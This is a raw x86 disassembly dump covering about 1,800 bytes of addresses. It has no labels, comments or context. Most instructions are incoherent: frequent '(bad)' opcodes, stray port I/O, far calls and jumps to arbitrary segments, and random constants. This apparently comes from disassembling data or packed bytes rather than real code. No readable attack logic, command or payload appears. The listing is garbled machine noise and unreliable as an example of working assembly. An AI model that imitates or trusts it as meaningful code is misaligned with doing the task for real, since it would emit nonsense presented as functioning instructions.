  411457:	lea    ebx,[esi+ecx*4]
  41145a:	or     al,bl
  41145c:	sbb    DWORD PTR [edx],0x2c
  41145f:	stc    
  411460:	push   esp
  411461:	out    0x31,eax
  411463:	mov    ebx,0x1a5dd3ea
  411468:	push   edi
  411469:	es dec eax
  41146b:	push   ebx
  41146c:	lock pop ds
  41146e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41146f:	xchg   esi,eax
  411470:	add    al,dh
  411472:	sbb    DWORD PTR [esi+ebx*1-0x66],eax
  411476:	xchg   ebx,eax
  411477:	mov    edx,0xf79cd35f
  41147c:	shr    edx,1
  41147e:	addr16 test al,0xbc
  411481:	xchg   edx,eax
  411482:	or     edx,eax
  411484:	retf   0x271f
  411487:	das    
  411488:	adc    bh,BYTE PTR [esp+edi*2-0x21940c13]
  41148f:	add    dl,ah
  411491:	push   edx
  411492:	test   cl,al
  411494:	frstpm(287 only) 
  411496:	cmp    DWORD PTR [esi],esi
  411498:	jmp    0x4114ac
  41149a:	stos   BYTE PTR es:[edi],al
  41149b:	in     eax,dx
  41149c:	or     eax,0xecc75406
  4114a1:	sub    DWORD PTR [eax+0x24],ecx
  4114a4:	mov    ecx,0x106576f2
  4114a9:	pop    ebx
  4114aa:	pop    eax
  4114ab:	loop   0x41149f
  4114ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114ae:	jo     0x41145d
  4114b0:	mov    esi,0x27af593c
  4114b5:	xchg   edi,eax
  4114b6:	jno    0x4114b4
  4114b8:	shl    BYTE PTR [edi-0x27eebf6c],cl
  4114be:	xchg   esp,eax
  4114bf:	scas   al,BYTE PTR es:[edi]
  4114c0:	xor    DWORD PTR [ecx+edi*8+0x2541fc65],edx
  4114c7:	cmp    BYTE PTR [eax],bl
  4114c9:	mov    ebp,0x4f0fd48a
  4114ce:	sub    DWORD PTR [eax-0x52],esp
  4114d1:	xchg   ebx,eax
  4114d2:	jl     0x411518
  4114d4:	pop    esi
  4114d5:	gs xor al,0x1f
  4114d8:	int    0x4
  4114da:	rol    DWORD PTR [edi-0x7],cl
  4114dd:	mov    ds:0x597916e,al
  4114e2:	adc    eax,0x8ce7a24d
  4114e7:	shr    BYTE PTR ds:0x49f1e398,1
  4114ed:	ss adc eax,0xa65f6dbc
  4114f3:	mov    edx,0x4f78f38e
  4114f8:	cs retf 0xa5eb
  4114fc:	inc    ecx
  4114fd:	retf   0x523a
  411500:	jbe    0x4114ce
  411502:	xor    al,0xe5
  411504:	push   eax
  411505:	sahf   
  411506:	and    eax,0x8800ccff
  41150b:	adc    ah,BYTE PTR [esi]
  41150d:	pop    ebx
  41150e:	enter  0xf611,0x64
  411512:	nop
  411513:	mov    ah,0x2b
  411515:	xchg   edx,eax
  411516:	(bad)  
  411517:	xor    BYTE PTR fs:[ecx],0xec
  41151b:	xor    al,0x4b
  41151d:	rcr    BYTE PTR [ebx+ecx*4+0x31],cl
  411521:	jno    0x4114e6
  411523:	in     al,0x6a
  411525:	or     DWORD PTR [ebp+0x6d835ec5],0xffffff9e
  41152c:	retf   0x3b1c
  41152f:	dec    edx
  411530:	inc    ebx
  411531:	test   edx,0xf589df15
  411537:	xor    BYTE PTR [eax-0x21da6991],0x44
  41153e:	mov    bh,0x3e
  411540:	pop    esp
  411541:	jge    0x411563
  411543:	(bad)  
  411544:	sbb    al,0x70
  411546:	shr    BYTE PTR [edx+0x0],1
  411549:	dec    edi
  41154a:	sub    edi,DWORD PTR [edi+0x666a3ba4]
  411550:	(bad)  
  411552:	xor    al,0xf
  411554:	sbb    bh,BYTE PTR [edi-0x50c99311]
  41155a:	adc    eax,0x9c38e7d3
  41155f:	adc    cl,BYTE PTR [edx-0x79ab034f]
  411565:	pop    ss
  411566:	ror    DWORD PTR [ebx],cl
  411568:	cmp    edi,DWORD PTR [edx+eax*8+0x517e3b33]
  41156f:	(bad)  
  411570:	je     0x4115ef
  411572:	mov    ch,0xf3
  411574:	mov    al,ds:0x80034308
  411579:	adc    BYTE PTR [esi-0x46],ch
  41157c:	jl     0x4115b3
  41157e:	push   edx
  41157f:	in     eax,dx
  411580:	sub    al,0x87
  411582:	scas   eax,DWORD PTR es:[edi]
  411583:	adc    DWORD PTR [edx+eiz*1],edi
  411586:	(bad)
  411589:	cdq    
  41158a:	cmp    DWORD PTR [edx+0x5f],esi
  41158d:	mov    esi,0x7897e53d
  411592:	es mov ah,0x58
  411595:	rol    BYTE PTR [edi+0xf],0xb9
  411599:	pushf  
  41159a:	call   FWORD PTR [eax+eiz*8-0x3180b85b]
  4115a1:	ror    DWORD PTR [edx],cl
  4115a3:	jg     0x411609
  4115a5:	and    DWORD PTR [edx],edi
  4115a7:	sbb    DWORD PTR [esi+0x43],esp
  4115aa:	mov    eax,0xfade420b
  4115af:	jg     0x4115b3
  4115b1:	pop    esp
  4115b2:	data16 jg 0x411627
  4115b5:	aad    0xf6
  4115b7:	pop    edi
  4115b8:	sar    DWORD PTR [edi+edi*2-0x2d],cl
  4115bc:	lahf   
  4115bd:	inc    esi
  4115be:	mov    ah,0xb
  4115c0:	js     0x41162e
  4115c2:	ds push esp
  4115c4:	mov    ds:0x50638a89,eax
  4115c9:	xchg   BYTE PTR [edx-0x66],bh
  4115cc:	or     eax,0x6633bd27
  4115d1:	inc    esi
  4115d2:	ret    
  4115d3:	mov    dl,0x60
  4115d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115d6:	loop   0x4115be
  4115d8:	xor    eax,0xc06fbd3e
  4115dd:	fimul  WORD PTR [eax-0x1c3a9070]
  4115e3:	push   esi
  4115e4:	pop    ss
  4115e5:	(bad)  
  4115e6:	lods   al,BYTE PTR ds:[esi]
  4115e7:	add    eax,0x321f5928
  4115ec:	xchg   ebp,eax
  4115ed:	(bad)  
  4115ee:	fisttp DWORD PTR [ebx-0xd]
  4115f1:	mov    ds:0x8370c712,al
  4115f6:	mov    al,0x9d
  4115f8:	mov    cl,bh
  4115fa:	les    ebp,FWORD PTR [edi]
  4115fc:	xor    al,bh
  4115fe:	aam    0x3e
  411600:	mov    es,WORD PTR [ecx-0x30]
  411603:	adc    edi,DWORD PTR ds:0xc3a1cc2a
  411609:	sub    BYTE PTR [edi],bh
  41160b:	ins    BYTE PTR es:[edi],dx
  41160c:	repz jns 0x4115e7
  41160f:	and    ecx,esp
  411611:	add    BYTE PTR ds:0xff7ba5a1,al
  411617:	pop    esp
  411618:	bswap  esp
  41161a:	add    eax,DWORD PTR [edx]
  41161c:	rcr    bh,cl
  41161e:	das    
  41161f:	iret   
  411620:	jbe    0x4115b0
  411622:	sbb    BYTE PTR [ebp+0x4c],cl
  411625:	es add al,0xed
  411628:	repz (bad) 
  41162a:	(bad)  
  41162b:	cld    
  41162c:	int3   
  41162d:	and    DWORD PTR [ebx-0x74],0x407e2abb
  411634:	push   cs
  411635:	inc    edx
  411636:	int    0xe1
  411638:	aad    0x38
  41163a:	sbb    edx,esp
  41163c:	jbe    0x4116aa
  41163e:	jmp    0x2fec6fd6
  411643:	xor    al,0xa2
  411645:	xchg   eax,edx
  411647:	cmp    DWORD PTR [edi+0x17ea4562],esi
  41164d:	and    eax,0x22d6ba75
  411652:	js     0x4116c3
  411654:	imul   esi,DWORD PTR [edi],0xffffff91
  411657:	lods   al,BYTE PTR ds:[esi]
  411658:	call   0xcf14:0xa10a7d4d
  41165f:	mov    esp,0x41ce0640
  411664:	into   
  411665:	dec    esi
  411666:	int3   
  411667:	nop
  411668:	pop    esp
  411669:	ins    DWORD PTR es:[edi],dx
  41166a:	sbb    eax,0xed2bba91
  41166f:	mov    BYTE PTR [edx+0x59fb9d0c],bl
  411675:	test   BYTE PTR [edx],0x3a
  411678:	cmp    eax,0x36257059
  41167d:	leave  
  41167e:	les    esi,FWORD PTR [ecx+eax*2]
  411681:	xchg   esi,eax
  411682:	shr    DWORD PTR [ecx+0x33],0xaa
  411686:	add    bh,BYTE PTR [ebx]
  411688:	and    eax,0xd7371070
  41168d:	adc    DWORD PTR [ebp+0x7f6627],0xfc1c661c
  411697:	adc    DWORD PTR [ebp+0x368f13d1],0xedaa05aa
  4116a1:	or     al,0x52
  4116a3:	arpl   si,sp
  4116a5:	mov    ah,0x2
  4116a7:	pop    es
  4116a8:	in     eax,0xe2
  4116aa:	inc    ecx
  4116ab:	xor    al,0x54
  4116ad:	leave  
  4116ae:	out    dx,al
  4116af:	mov    cl,0x97
  4116b1:	push   ebx
  4116b2:	lea    eax,[eax]
  4116b4:	test   cl,al
  4116b6:	xchg   DWORD PTR [esi],esi
  4116b8:	arpl   WORD PTR [edx-0x2e],cx
  4116bb:	ret    
  4116bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116bd:	loope  0x411663
  4116bf:	sar    DWORD PTR [esi-0x3336d4b4],0x1a
  4116c6:	xchg   ebp,eax
  4116c7:	jbe    0x411688
  4116c9:	les    ebp,FWORD PTR [edx]
  4116cb:	cwde   
  4116cc:	ins    DWORD PTR es:[edi],dx
  4116cd:	repnz mov bl,0xc4
  4116d0:	push   ss
  4116d1:	mov    BYTE PTR [esi-0x42],cl
  4116d4:	xor    BYTE PTR [esi-0x7bec41fc],bl
  4116da:	fld    QWORD PTR [ebx-0x1c]
  4116dd:	pushf  
  4116de:	pop    ds
  4116df:	cli    
  4116e0:	gs cmp al,0xff
  4116e3:	(bad)  
  4116e5:	xchg   BYTE PTR [edi+0x6c],dl
  4116e8:	inc    ebx
  4116e9:	cmp    bl,BYTE PTR [esi+0x22]
  4116ec:	mov    BYTE PTR [ebx-0x53469a84],ah
  4116f2:	aas    
  4116f3:	pop    ss
  4116f4:	test   eax,0x9dfa806a
  4116f9:	aad    0xc0
  4116fb:	leave  
  4116fc:	sbb    BYTE PTR [esi],cl
  4116fe:	inc    edx
  4116ff:	loope  0x411756
  411701:	scas   al,BYTE PTR es:[edi]
  411702:	cmc    
  411703:	lea    ebp,[ebx-0x5245ab7d]
  411709:	stos   BYTE PTR es:[edi],al
  41170a:	push   es
  41170b:	inc    esi
  41170c:	pop    ecx
  41170d:	jl     0x4116c2
  41170f:	(bad)  
  411711:	push   0x29
  411713:	clc    
  411714:	aas    
  411715:	lea    ecx,[eax-0x58]
  411718:	pushf  
  411719:	lahf   
  41171a:	test   eax,0xcc8dea12
  41171f:	jb     0x41171d
  411721:	push   0xffffffbe
  411723:	cdq    
  411724:	inc    esp
  411725:	outs   dx,BYTE PTR ds:[esi]
  411726:	arpl   WORD PTR [ecx-0x6185713],cx
  41172c:	cmp    eax,0x31569a30
  411731:	out    0x63,eax
  411733:	xchg   esp,eax
  411734:	repz aas 
  411736:	mov    ch,0x86
  411738:	ja     0x4116f2
  41173a:	mov    fs:0xbb986d7c,al
  411740:	aaa    
  411741:	js     0x411764
  411743:	test   al,0xb4
  411745:	lods   al,BYTE PTR ds:[esi]
  411746:	add    cl,BYTE PTR [edi]
  411748:	or     BYTE PTR [esi+0x32683b9f],bh
  41174e:	sti    
  41174f:	or     bh,al
  411751:	xchg   esp,eax
  411752:	fstp   QWORD PTR [edi-0x306bb40a]
  411758:	push   0xffffffa1
  41175a:	ja     0x4116fc
  41175c:	imul   esp,DWORD PTR [ecx],0xe22c8a91
  411762:	jmp    0x4116ea
  411764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411765:	push   ss
  411766:	dec    esi
  411767:	push   edx
  411768:	fisttp WORD PTR [esi-0x294d624f]
  41176e:	mov    WORD PTR [ebx+0xd],ds
  411771:	xor    esi,DWORD PTR [edi+esi*1+0x7e8174b4]
  411778:	and    DWORD PTR [ecx],edi
  41177a:	loop   0x411784
  41177c:	fmul   DWORD PTR [edi-0x69]
  41177f:	das    
  411780:	iret   
  411781:	arpl   WORD PTR [eax],cx
  411783:	test   ah,0x3
  411786:	cmp    edi,DWORD PTR [eax-0x12]
  411789:	jnp    0x41172c
  41178b:	clc    
  41178c:	xor    DWORD PTR [edi-0x6adb79f3],edx
  411792:	(bad)
  411796:	(bad)  
  411797:	dec    edx
  411798:	add    DWORD PTR [esi],eax
  41179a:	mov    ebp,0x3986186d
  41179f:	out    dx,al
  4117a0:	jmp    0xc5d6:0x928f2ac0
  4117a7:	(bad)  
  4117a8:	rol    esp,1
  4117aa:	adc    al,0xef
  4117ac:	sahf   
  4117ad:	pop    ebx
  4117ae:	jmp    0x478f616
  4117b3:	pop    ss
  4117b4:	cld    
  4117b5:	sub    DWORD PTR [edx+0x68],edx
  4117b8:	mov    esp,0xa71b3289
  4117bd:	imul   ecx,ebx,0xbd828884
  4117c3:	adc    esp,ecx
  4117c5:	repnz ss loope 0x4117c3
  4117c9:	jmp    0x4117a0
  4117cb:	cdq    
  4117cc:	adc    eax,0x74da62b
  4117d1:	pop    esi
  4117d2:	mov    al,ds:0xe12497aa
  4117d7:	cmp    BYTE PTR [ecx-0x2348788c],ah
  4117dd:	inc    edx
  4117de:	cwde   
  4117df:	idiv   edx
  4117e1:	pop    ecx
  4117e2:	scas   eax,DWORD PTR es:[edi]
  4117e3:	test   eax,0x6c547b36
  4117e8:	xchg   edi,eax
  4117e9:	jns    0x4117c9
  4117eb:	shl    BYTE PTR [ebx-0x27],cl
  4117ee:	mov    eax,ds:0x6b55776f
  4117f3:	xchg   ebp,eax
  4117f4:	ret    
  4117f5:	jnp    0x41181e
  4117f7:	bound  edx,QWORD PTR [eax+0x7f]
  4117fa:	sbb    eax,edx
  4117fc:	mov    bh,bl
  4117fe:	mov    al,0x28
  411800:	ja     0x411819
  411802:	mov    bh,0x67
  411804:	imul   esi,ecx,0xcf5553dc
  41180a:	dec    ecx
  41180b:	inc    esi
  41180c:	test   ebx,ebp
  41180e:	add    esi,eax
  411810:	rcl    al,1
  411812:	or     al,0x29
  411814:	jnp    0x411867
  411816:	stos   BYTE PTR es:[edi],al
  411817:	mov    ch,0xcc
  411819:	xchg   esp,eax
  41181a:	push   ebp
  41181b:	pusha  
  41181c:	fcom   QWORD PTR [esi+0x3d79457d]
  411822:	jge    0x4117e8
  411824:	icebp  
  411825:	int3   
  411826:	mov    dh,0x28
  411828:	bound  edi,QWORD PTR [ebp+0x4f]
  41182b:	retf   
  41182c:	jmp    0x4117fc
  41182e:	jle    0x4117d1
  411830:	push   ds
  411831:	jge    0x41185b
  411833:	xchg   edx,eax
  411834:	pusha  
  411835:	cmp    esp,esp
  411837:	push   ds
  411838:	js     0x411826
  41183a:	push   eax
  41183b:	pop    ebp
  41183c:	and    eax,0x64c1145d
  411841:	jecxz  0x41185f
  411843:	int    0x6
  411845:	pop    ebp
  411846:	adc    dh,BYTE PTR [ecx+0x1b]
  411849:	scas   al,BYTE PTR es:[edi]
  41184a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41184b:	cli    
  41184c:	mov    ch,0x99
  41184e:	mov    bl,al
  411850:	mov    ds:0x51d1becc,eax
  411855:	inc    esp
  411856:	mov    dl,0xbc
  411858:	xchg   ecx,eax
  411859:	pop    ecx
  41185a:	mov    cl,BYTE PTR [edx-0x49f808d4]
  411860:	shl    DWORD PTR [ebx-0x17],1
  411863:	mov    ebp,0xc8a75938
  411868:	repz xlat BYTE PTR ds:[ebx]
  41186a:	add    ebx,DWORD PTR [ebp+0x67]
  41186d:	or     eax,0xc2e52cfd
  411872:	addr16 pop ebx
  411874:	test   eax,0xe29b22cb
  411879:	pop    edx
  41187a:	rol    BYTE PTR [ebp-0x6408f45b],0x54
  411881:	pop    eax
  411882:	mov    ds:0x28ac44c7,eax
  411887:	xchg   BYTE PTR [esi+0x7],bh
  41188a:	or     cl,dl
  41188c:	mov    bl,0xc4
  41188e:	or     DWORD PTR [edx+0x3f],edx
  411891:	loope  0x4118c9
  411893:	repz xor edx,edi
  411896:	leave  
  411897:	imul   ebx,DWORD PTR [eax+0x27833bf6],0xffffff99
  41189e:	ins    DWORD PTR es:[edi],dx
  41189f:	add    cl,BYTE PTR [esi+eiz*1+0x5d]
  4118a3:	and    cl,BYTE PTR [ebx+eax*1]
  4118a6:	loop   0x41186f
  4118a8:	xchg   BYTE PTR [esi],dh
  4118aa:	push   esp
  4118ab:	outs   dx,BYTE PTR ds:[esi]
  4118ac:	cmc    
  4118ad:	jne    0x411838
  4118af:	and    edi,ecx
  4118b1:	sahf   
  4118b2:	pop    ds
  4118b3:	xchg   ebx,eax
  4118b4:	adc    bh,BYTE PTR [esi]
  4118b6:	xor    eax,0x64dcff40
  4118bb:	shl    BYTE PTR [eax],cl
  4118bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118be:	div    DWORD PTR [ebx-0x1d1b7dec]
  4118c4:	adc    esi,DWORD PTR [edx]
  4118c6:	mov    DWORD PTR [edi+0xc69372e],edi
  4118cc:	std    
  4118cd:	stos   BYTE PTR es:[edi],al
  4118ce:	mov    ah,0x84
  4118d0:	addr16 jl 0x411930
  4118d3:	or     al,0xbf
  4118d5:	sbb    bl,BYTE PTR [edi+0x63]
  4118d8:	add    BYTE PTR [edi],dh
  4118da:	inc    ebx
  4118db:	mov    eax,0xc275c534
  4118e0:	jmp    0x4118d2
  4118e2:	cmp    cl,BYTE PTR [esi+0x7cb7dfe0]
  4118e8:	pop    ds
  4118e9:	inc    esp
  4118ea:	mov    ah,0x91
  4118ec:	cmp    DWORD PTR [eax-0x231915a5],edx
  4118f2:	push   0xecf4f82d
  4118f7:	stos   DWORD PTR es:[edi],eax
  4118f8:	lods   al,BYTE PTR ds:[esi]
  4118f9:	and    DWORD PTR [eax+0x449d0e89],0x78ff643b
  411903:	jno    0x411933
  411905:	push   esp
  411906:	sahf   
  411907:	lahf   
  411908:	push   es
  411909:	cmp    BYTE PTR [edi-0x7cdf31ae],al
  41190f:	mov    DWORD PTR [edx+0x38],ebp
  411912:	mov    edi,0xd0057835
  411917:	cmp    DWORD PTR [ebx],ecx
  411919:	into   
  41191a:	xchg   ecx,eax
  41191b:	push   0xfffffff7
  41191d:	in     eax,dx
  41191e:	les    edi,FWORD PTR ds:0x95c33ee4
  411924:	push   ecx
  411925:	xor    BYTE PTR [edx+0x50a33029],0xf2
  41192c:	dec    ebx
  41192d:	cli    
  41192e:	repz fisttp DWORD PTR [ebp+0x1de60129]
  411935:	jb     0x411975
  411937:	std    
  411938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411939:	mov    al,BYTE PTR [edx-0x2d]
  41193c:	rcl    BYTE PTR [edx],cl
  41193e:	jge    0x41194a
  411940:	cmp    eax,0x96f6e98f
  411945:	ss pop edi
  411947:	lds    edx,FWORD PTR [ebx]
  411949:	out    dx,eax
  41194a:	dec    esp
  41194b:	xchg   ebx,eax
  41194c:	jmp    0x1f598ae3
  411951:	and    al,0x8e
  411953:	dec    ebp
  411954:	sbb    eax,DWORD PTR [esi]
  411956:	enter  0x1509,0xb
  41195a:	and    eax,0x418727bf
  41195f:	lods   eax,DWORD PTR ds:[esi]
  411960:	cmp    BYTE PTR [ebx-0x3b],ch
  411963:	push   ecx
  411964:	cli    
  411965:	xchg   ebx,eax
  411966:	aas    
  411967:	in     eax,dx
  411968:	cmp    BYTE PTR [ecx+0x20fdec42],cl
  41196e:	jnp    0x41196a
  411970:	gs test al,0x5f
  411973:	jno    0x411943
  411975:	repnz not BYTE PTR [edi+edx*4+0x5c]
  41197a:	and    eax,0x904bad91
  41197f:	xor    al,0x29
  411981:	cwde   
  411982:	out    dx,al
  411983:	sbb    edx,esi
  411985:	gs pop es
  411987:	xchg   esi,eax
  411988:	sti    
  411989:	hlt    
  41198a:	dec    ecx
  41198b:	ret    0x6be7
  41198e:	rol    BYTE PTR [eax],1
  411990:	stc    
  411991:	fwait
  411992:	push   0x96f37257
  411997:	jmp    0x601c346e
  41199c:	call   0x89bd:0xdd5db470
  4119a3:	aad    0xa
  4119a5:	(bad)  
  4119a6:	push   ebp
  4119a7:	(bad)  
  4119a8:	(bad)  
  4119a9:	cmp    ebp,DWORD PTR [esi+0x26d158b4]
  4119af:	jmp    0x5af6:0x887afdeb
  4119b6:	adc    al,0xde
  4119b8:	or     dh,bh
  4119ba:	imul   esi,DWORD PTR [eax+0x6c],0xee07c60e
  4119c1:	lea    ebx,[edi-0x24]
  4119c4:	push   esi
  4119c5:	pop    ecx
  4119c6:	ja     0x41199c
  4119c8:	sar    BYTE PTR [ebx],cl
  4119ca:	ss push cs
  4119cc:	xor    al,0xf8
  4119ce:	lock xchg esp,eax
  4119d0:	int    0xeb
  4119d2:	enter  0x4829,0x1e
  4119d6:	inc    edx
  4119d7:	arpl   WORD PTR [ecx+0x2325f635],di
  4119dd:	jbe    0x411a24
  4119df:	sar    BYTE PTR [ebx-0x5a],1
  4119e2:	mov    bh,0x43
  4119e4:	pop    edi
  4119e5:	mov    dh,0x89
  4119e7:	mov    esp,0xac3a9307
  4119ec:	inc    ecx
  4119ed:	pushf  
  4119ee:	xchg   ecx,eax
  4119ef:	or     al,0x90
  4119f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119f2:	jmp    0xeb57ba12
  4119f7:	lea    edx,[ebp-0x18773b92]
  4119fd:	pop    ecx
  4119fe:	inc    ecx
  4119ff:	cmp    edi,DWORD PTR [ecx-0x14ad6778]
  411a05:	xchg   edi,eax
  411a06:	cmp    eax,0xcc9b7304
  411a0b:	or     al,0xe8
  411a0d:	mov    bl,0x3f
  411a0f:	ja     0x411a83
  411a11:	sbb    eax,0x9c65c95d
  411a16:	adc    DWORD PTR [eax+0x4866ce44],edi
  411a1c:	loopne 0x411a18
  411a1e:	jne    0x411a76
  411a20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a21:	je     0x411a7b
  411a23:	ja     0x411a9e
  411a25:	mov    ebp,0xbfd391b2
  411a2a:	aaa    
  411a2b:	nop
  411a2c:	pop    esi
  411a2d:	rol    BYTE PTR [ebp-0x2a],1
  411a30:	frstor [ebp+esi*2-0x6b5640d9]
  411a37:	mov    eax,0x6706804c
  411a3c:	aam    0x3d
  411a3e:	mov    BYTE PTR [edi],dl
  411a40:	cmp    cl,BYTE PTR [ecx-0x61]
  411a43:	cs mov al,0xb1
  411a46:	stos   DWORD PTR es:[edi],eax
  411a47:	hlt    
  411a48:	push   0x2c94e152
  411a4d:	fild   QWORD PTR [ecx+edi*2]
  411a50:	or     ah,dh
  411a52:	call   0xc583234a
  411a57:	and    DWORD PTR [edi+0x2b],eax
  411a5a:	and    eax,edi
  411a5c:	inc    esi
  411a5d:	cmp    al,0xc1
  411a5f:	fidiv  WORD PTR [eax-0x17ac9020]
  411a65:	cmp    DWORD PTR [ecx],esp
  411a67:	cmp    DWORD PTR [edx+0x60],0x9687a63
  411a6e:	(bad)  
  411a70:	ins    DWORD PTR es:[edi],dx
  411a71:	or     DWORD PTR ds:0xe5c4139d,ecx
  411a77:	jmp    FWORD PTR [ecx-0x7a]
  411a7a:	adc    dh,BYTE PTR [ebx-0x3b38f86]
  411a80:	lods   al,BYTE PTR ds:[esi]
  411a81:	clc    
  411a82:	mov    ecx,0x448b6f1f
  411a87:	xor    esp,DWORD PTR cs:[ebx-0x4a]
  411a8b:	inc    esi
  411a8c:	pop    ecx
  411a8d:	outs   dx,DWORD PTR ds:[esi]
  411a8e:	cmp    bh,bh
  411a90:	sbb    DWORD PTR [ebx-0x21f83996],eax
  411a96:	xchg   edx,ebp
  411a98:	in     eax,dx
  411a99:	aas    
  411a9a:	int    0xf0
  411a9c:	xchg   ebp,eax
  411a9d:	test   al,0x58
  411a9f:	test   BYTE PTR [ecx+0x40],cl
  411aa2:	arpl   WORD PTR [ecx+0x13],bp
  411aa5:	mov    edi,ecx
  411aa7:	or     DWORD PTR [edi+0x50],eax
  411aaa:	xlat   BYTE PTR ds:[ebx]
  411aab:	stc    
  411aac:	cmp    DWORD PTR [edx],esp
  411aae:	leave  
  411aaf:	sbb    eax,0x4b85e4a7
  411ab4:	(bad)  
  411ab5:	mov    bh,0xb7
  411ab7:	mov    ecx,0x473f234a
  411abc:	or     al,0x6d
  411abe:	adc    ecx,DWORD PTR [edx]
  411ac0:	sets   BYTE PTR [esi+0x19cc99ed]
  411ac7:	not    BYTE PTR [esi]
  411ac9:	pop    edx
  411aca:	or     ecx,ebx
  411acc:	mov    ecx,0xc3a56175
  411ad1:	mov    ch,0x3e
  411ad3:	out    0x8c,al
  411ad5:	into   
  411ad6:	lea    esi,[esi]
  411ad8:	outs   dx,DWORD PTR ds:[esi]
  411ad9:	mov    bh,0xbe
  411adb:	es aas 
  411add:	pop    ss
  411ade:	idiv   BYTE PTR [eax]
  411ae0:	mov    ecx,0x83c4509f
  411ae5:	jp     0x411a9b
  411ae7:	gs jp  0x411ad2
  411aea:	cmp    BYTE PTR [ecx],dh
  411aec:	fsubp  st(4),st
  411aee:	daa    
  411aef:	mov    dl,0xc
  411af1:	and    al,0x4e
  411af3:	dec    ecx
  411af4:	or     ebp,DWORD PTR [ebp-0x5f]
  411af7:	call   0xf70e:0x8c3b51a5
  411afe:	xor    al,0x97
  411b00:	mov    ch,0xc3
  411b02:	call   0xea3f29b7
  411b07:	jo     0x411b21
  411b09:	sbb    bl,0x3d
  411b0c:	mov    esp,0xdeaba5c1
  411b11:	ins    BYTE PTR es:[edi],dx
  411b12:	push   ebp
  411b13:	out    dx,eax
  411b14:	popf   
  411b15:	adc    DWORD PTR ds:0xff79aaac,esp
  411b1b:	retf   
  411b1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b1d:	retf   0x4b90
  411b20:	adc    al,0x86
  411b22:	scas   al,BYTE PTR es:[edi]
  411b23:	push   eax
  411b24:	fmul   DWORD PTR [ecx+0x1cfee005]
  411b2a:	leave  
  411b2b:	popa   
  411b2c:	outs   dx,BYTE PTR ds:[esi]
  411b2d:	adc    edx,DWORD PTR [esi+0x4]
  411b30:	loopne 0x411b99
  411b32:	mov    ds:0x586c0139,al
  411b37:	cwde   
  411b38:	push   edx
  411b39:	stc    
  411b3a:	scas   al,BYTE PTR es:[edi]
  411b3b:	(bad)  
  411b3c:	bound  ecx,QWORD PTR [ebx]
  411b3e:	mov    ds:0x6344a97e,eax
  411b43:	mov    esp,0x513043d1
  411b48:	(bad)  
  411b49:	mov    ecx,0x6301151e
  411b4e:	push   esi
  411b4f:	fst    DWORD PTR [edi]
  411b51:	clc    
  411b52:	cwde   
  411b53:	fcmovnbe st,st(7)
  411b55:	lea    ebp,[edx-0x61]
  411b58:	popf   
  411b59:	dec    eax
  411b5a:	dec    ebx
  411b5b:	sbb    eax,0x56e26d89
  411b60:	add    al,0x77
  411b62:	mov    eax,0x645c9db3
  411b67:	mov    ds:0x4fc1cf72,eax
  411b6c:	mov    bh,0x48
  411b6e:	jns    0x411bb7
  411b70:	push   ds
  411b71:	(bad)  
  411b72:	mov    esp,0x7fcea384
  411b77:	mov    ?,WORD PTR [edi+esi*1-0x29b012a]
  411b7e:	add    esp,esi
  411b80:	pop    edx
  411b81:	test   al,0x4
  411b83:	mov    ecx,0x2f8d3142
  411b88:	in     al,0x32
  411b8a:	(bad)  
  411b8b:	cmc    
  411b8c:	xchg   DWORD PTR [esi],edi
  411b8e:	mov    ds:0x694ad72e,eax
  411b93:	mov    esi,0x95542dd1
  411b98:	idiv   BYTE PTR [eax+0x2b]
  411b9b:	push   0xffffff91
  411b9d:	data16 test BYTE PTR [esi+0x23879c22],ah
  411ba4:	stc    
  411ba5:	mov    ch,0x42
  411ba7:	popa   
  411ba8:	call   0x24ed:0xb7532ada
  411baf:	sbb    al,0x1d
  411bb1:	fadd   DWORD PTR [esi]
  411bb3:	xchg   ecx,eax
  411bb4:	inc    esp
  411bb5:	mov    dh,0xf1
  411bb7:	pop    eax
  411bb8:	and    DWORD PTR [esi-0x3b],ecx
  411bbb:	das    
  411bbc:	sub    al,0x29
  411bbe:	(bad)  
  411bbf:	push   esp
  411bc0:	pop    ds
  411bc1:	push   ds
  411bc2:	inc    BYTE PTR [eax]
  411bc4:	pop    es
  411bc5:	stos   BYTE PTR es:[edi],al
  411bc6:	retf   0xb382
  411bc9:	push   es
  411bca:	cdq    
  411bcb:	cli    
  411bcc:	jge    0x411c37
  411bce:	clc    
  411bcf:	add    DWORD PTR [eax*8+0x10ba13cc],esi
  411bd6:	cmp    eax,0x790b2c3c
  411bdb:	in     eax,0xca
  411bdd:	adc    edx,eax
  411bdf:	mov    esp,0x29849fe9
  411be4:	sub    dh,BYTE PTR [edx-0x613bebf9]
  411bea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411beb:	je     0x411ba9
  411bed:	adc    ecx,ebp
  411bef:	sub    dl,ah
  411bf1:	mov    eax,0xd837e267
  411bf6:	rol    BYTE PTR [edi+ebp*4-0x52],0xf9
  411bfb:	mov    cl,0x48
  411bfd:	pop    esp
  411bfe:	pushf  
  411bff:	icebp  
  411c00:	xchg   edi,eax
  411c01:	sbb    al,0x45
  411c03:	addr16 mov bl,0x10
  411c06:	push   ebp
  411c07:	sub    BYTE PTR [ebx-0x5e50073f],0xe1
  411c0e:	pop    ds
  411c0f:	(bad)  
  411c10:	cwde   
  411c11:	leave  
  411c12:	frstor [ebx+0x53]
  411c15:	push   ecx
  411c16:	mov    al,0xaa
  411c18:	ja     0x411be9
  411c1a:	pop    ebx
  411c1b:	retf   0x186
  411c1e:	pop    eax
  411c1f:	push   es
  411c20:	add    bh,BYTE PTR [ebp-0x7e]
  411c23:	cmc    
  411c24:	pop    es
  411c25:	das    
  411c26:	mov    ?,WORD PTR [ebp-0x50c9d96]
  411c2c:	mov    ch,0xd8
  411c2e:	repnz popa 
  411c30:	xchg   esi,esp
  411c32:	push   fs
  411c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c35:	test   BYTE PTR ds:0x19b3e888,dh
